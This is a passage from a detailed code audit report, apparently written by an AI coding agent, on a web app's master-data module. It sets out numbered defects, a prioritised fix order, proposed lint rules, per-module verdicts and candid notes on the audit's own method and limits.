  categoriesList={categoriesList.map((c) => ({ id: c.kode, name: `${c.kode} - ${c.kategori}` })) as any}
  ```
  `GoodsCreateCanvas` is declared to take `KategoriBarangItem[]` (the `_types` shape: `code/name/description/type`) and instead receives `{ id, name }` where `id` is a **code** like `BBK`. The canvas then writes `categoryId: found.id` — a code, not a UUID — and the page resolves it back with `categoriesList.find(c => c.kode === …)` (`:260`). When that lookup misses — and it misses on first load, because the initial `kategoriKode` is the hardcoded `"BBK"` at `:364` — **no `categoryId` is sent at all** and the item is created uncategorised while the select visibly shows a category. The same adapter also drops the two CoA fields, and `GoodsCreateCanvas` renders option *values* that are literal strings like `"110401 - Persediaan Bahan Baku"`, which are not UUIDs either.
  The `as any` at `:615` is what hides all of this from `npm --prefix frontend run typecheck`, which `CLAUDE.md` §6 requires to pass.
- **Actionable Execution Plan**:
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:615` — pass the real `KategoriBarangItem[]` and delete the `as any`.
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:364` — stop seeding a hardcoded `"BBK"`; start from the loaded categories or empty.
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:598-613` — the `as any` seams at `:598`, `:615` are the load-bearing ones; remove them and let the compiler find the remaining mismatches.
  - **[Verification]** Creating a material with a category selected stores that category's real UUID; today it may store `null` while the UI claims otherwise.
  - Note: the dead `_hooks/useGoodsOperations.ts:85-97` resolves accounts from `/finance/accounts` correctly — it is the better of the two implementations (`MD-32`).


---

## 📌 Cross-cutting: reference implementations already in the codebase

Three modules in this cluster already do the right thing. The fixes above should copy them rather than invent new patterns:

| Concern | Reference implementation | Use it for |
|---|---|---|
| Pagination envelope `{ data, total, page, limit, totalPages }` | `backend/src/modules/master/services/materials.service.ts:47-127` | `MD-08`, `MD-25` |
| Unique-collision pre-check → `BadRequestException` | `backend/src/modules/master/services/materials.service.ts:243-253`, `:309-326` | `MD-13`, `MD-30` |
| Server-generated code via `masterKode` inside `$transaction` | `backend/src/modules/master/services/categories.service.ts:36-51` | `MD-13`, `MD-06` (new `Customer.code`) |
| Multi-write atomicity | `backend/src/modules/master/services/warehouses.service.ts:120-141` (`syncUserAccess`) | any bulk update |
| Thin-route redirect pattern | `frontend/src/app/(dashboard)/master/categories/page.tsx:13`, `vendors/page.tsx:13`, `users/page.tsx:4` | `MD-05` |

Two anti-patterns to delete, not copy: `data: dto` raw pass-through (`MD-27`) and `findAll` with no `take` (`MD-08`, `MD-25`).

---

## Fix order

Sequenced so each step is independently shippable and de-risks the next.

1. **Unblock error reporting** — `MD-39` (toast crash, 27 sites), `MD-01` (Prisma P-code mapping), `MD-02` (field errors, two breaks). Every other fix is hard to verify while a real failure crashes the Toaster and presents as "An unexpected internal error occurred". `MD-39` comes first because it is the only one that takes down a UI subtree rather than degrading a message.
2. **Make the goods page create and delete work** — `MD-40` (SKU collision blocks the create path), `MD-42` (deep-link form unsaveable), `MD-41` (delete unreachable + "Hapus Permanen" lie). Until these land, `/master/goods` cannot write a row through the UI at all.
3. **Unblock the goods page** — `MD-03` (`unwrapResponse`). This is a one-line change that turns a permanently empty flagship page into a working one, and it is the highest visible-value item in the ticket. **Ship it with `MD-43`** — alone it converts an obviously-empty table into one whose filter, search, sort and page-size controls silently do nothing.
4. **Unblock the finance side** — `MD-06` (a write path for `customers`). Forward-looking today, an outage the moment the first sales invoice is posted. Independent of 1–3, but the reason it is early rather than late.
5. **Stop the silent data corruption** — `MD-18` (`"-"` written to `phone`/`contact`), `MD-23` (import reporting 0 rejected while discarding every row), `MD-24` (export button that lies). These are the three findings where the UI actively misinforms rather than merely fails.
6. **Close the unreachable actions** — `MD-19` (supplier delete), `MD-20` (category tabs), `MD-36` (PIC picker), `MD-46` (category select writes a code into a UUID field).
7. **Pagination** — `MD-08`, `MD-25`, with the four FE pages to match.
8. **Contract cleanup** — `MD-07`, `MD-09`, `MD-26`, `MD-44`, `MD-18`'s mapper half, `MD-04`.
9. **Form correctness** — `MD-11`, `MD-17`, `MD-29`, `MD-10`, `MD-15`, `MD-34`, `MD-35`, `MD-22`, `MD-12`, `MD-13`, `MD-37`, `MD-45`.
10. **Dead code and structure** — `MD-05`, `MD-32`, `MD-33`, then the page-size refactor under `CLAUDE.md`'s 150-line cap.

Steps 1–6 are the ones with user-visible or data-integrity consequences. Steps 7–10 are hygiene, valuable, and safely deferrable.

### Two guardrails worth adding before the backlog is worked

Both are lint rules, and both exist because the same defect was found twice in this cluster and TypeScript could not see either:

- **Ban `toast.*(extractApiError(` without `.message`** — 27 call sites throw today (`MD-39`).
- **Ban a dialog-open `useState` setter that only ever receives `null`** — this is the exact shape of `MD-19` (supplier delete) and `MD-41` (goods delete): state declared, handler written, no call site with a real value. The same shape exists in `isCategoryModalOpen` / `editingCategory` (`MD-20`).


---

## Per-module verdict

| Module / route | Verdict | Worst finding | Open |
|---|---|---|---|
| **Global error handling** | **Broken** | `toast.error(extractApiError(e))` passes an object where a string is required — React throws and takes down the Toaster, at 27 sites repo-wide | 3 |
| `/master/goods` | **Broken** | Renders a permanently empty table (`unwrapResponse`), and its SKU generator collides on every page so the create path is blocked too | 10 |
| `/master/materials` | **Delete it** | Live fossil duplicate that writes `stockQty`, the one field `/master/goods` deliberately refuses | 2 |
| `/master/customers` | **Broken** | `customers` table has zero write paths; 3 NOT NULL FKs point at it | 15 |
| `/master/suppliers` | **Broken** | Delete is unreachable — `setSupplierToDelete` is only ever called with `null`; `"-"` round-trips into real columns | 9 |
| `/master/warehouses` | **Broken** | Grid hardcodes `lokasi: "Sidoarjo"` and `picName: "Ghufron Dreamlab"` over real DB values | 4 |
| `/master/categories` | **Partly working** | Hand-typed `code` skips the sequence and collides into a 500 | 1 |
| `/master/divisions` | **Mostly working** | `findOne` returns HTTP 200 with a `null` body instead of 404 | 1 |
| `/master/personnel` | **Working** | The only paginated list in the module; no CRUD defect found | 0 |
| Thin routes (5) | **Working** | 5 redirects, all correct; absent from `ROUTE_MAP.md` | 1 |
| Dead `_hooks` (1 648 lines) | **Dead** | 3 hooks, 0 import sites; every domain has two disagreeing copies of its logic | 1 |
| **Total** | | | **46** |

**Cluster verdict: 46 findings — 10 Critical, 9 Contract Mismatch, 11 Broken UX State, 8 Missing Validation, 8 Edge Case.**

The module is not partially degraded. `/master/goods` cannot read a row (empty table), cannot create one (SKU collision), cannot delete one (no button), and crashes the Toaster on any error. `/master/customers` writes the wrong table. `/master/suppliers` cannot delete, and writes `"-"` into real columns. Each fails at the most basic level, and the consistency of the pattern — the same state-declared-but-never-set defect appearing in two different pages, the same form-never-reset defect in all four, a Tri-Layer `_hooks` directory with zero import sites in three of three — points to pages built against an imagined API and never exercised against the running one. `/master/personnel` and the five thin routes are the evidence that the conventions were followed correctly when someone actually ran the feature.

**What is genuinely right and should be preserved:** every controller applies a typed DTO (no `body: any`) under `whitelist + forbidNonWhitelisted + transform`; `materials.service.ts` paginates correctly and pre-checks `code` uniqueness on both create and update; `categories.service.ts` allocates codes through `masterKode` in a `$transaction`; `warehouses.service.ts:120-141` wraps its multi-write in `$transaction`; double-submit is guarded via `disabled={isPending}`; loading, error and empty states are all rendered; and `goods/page.tsx:272-274` documents, correctly, why `stockQty` must not be written from a master form. The problems are in what was wired, not in what was written.

---

## Method notes and limits of this audit

- **Schema path correction.** `backend/prisma/schema.prisma` does not exist. The schema is split across 26 files under `backend/prisma/schema/`. Findings cite `finance.prisma`, `warehouse.prisma`, `bussdev.prisma`.
- **Prior context verified, not assumed.** The claim that `Customer` has no write path was tested directly: a repo-wide grep for `prisma.customer.|tx.customer.` across `backend/src` returns 5 hits, all `findUnique`, all in `modules/finance/`. Zero writes. The claim that `/master/customers` writes a `SalesLead` is confirmed at `customers.service.ts:278`, `:331`, `:365` and `import-export.service.ts:640`. The entity boundary is preserved throughout: `Customer` and `SalesLead` are treated as separate tables, and `MD-06` proposes adding a write path to `Customer`, not merging it into `SalesLead`.
- **Counts are intersection-based where it matters.** The dead-hooks figure (3 files, 1 648 lines) comes from grepping each hook's exported name and requiring exactly one hit — its own definition. The route-map gap comes from diffing the directory listing against `docs/ROUTE_MAP.md`, not from name similarity. The 6 phantom supplier columns were each checked against the `Supplier` model rather than inferred from a grep miss.
- **One finding is SUSPECTED.** `MD-38` (CSV injection coverage) is marked SUSPECTED because I confirmed the guard exists on `phone` but read the serialiser only partially, so the absence of the guard elsewhere is inferred rather than observed. Every other finding is CONFIRMED against code I read at the cited line (45 CONFIRMED / 1 SUSPECTED).
- **Two independent passes over `/master/goods`, and a correction resulted.** The goods route was audited twice by different passes reading the same HEAD. The second pass (`MD-39`–`MD-46`) surfaced eight defects the first had not, and **corrected one from the first**: `MD-02` originally claimed the filter emits `details.fieldErrors`; the second pass found the `ValidationErrorFactory` writes `fieldErrors` while the filter reads `r.details`, so the array is dropped one layer earlier than first stated. `MD-02` has been rewritten to describe both breaks. Every finding retained from the second pass was checked against a cited line before inclusion.
- **Three subagents were dispatched; one returned.** Two died on a provider rate limit (HTTP 503 / 429) and their assigned routes — customers FE, warehouses and thin routes — were audited directly instead. The goods subagent completed and is the source of `MD-39`–`MD-46`. Nothing in this ticket rests on an unreturned agent's claims.
- **No frontend design changes are proposed.** Per brief rule 3, nothing here touches Tailwind, design tokens, or `@/components/dna`. The department dashboards are signed-off inline-styled ports and were out of scope; none are in this cluster.
- **Not covered.** `personnel.service.ts` was checked for pagination shape only and not audited line by line; it is reported as working on that basis. The `registrations` and `estates` relations on `SalesLead` were not traced to consumers. `syncUserAccess` (`warehouses.service.ts:120-141`) was verified to use `$transaction` but its role/permission logic was not audited.


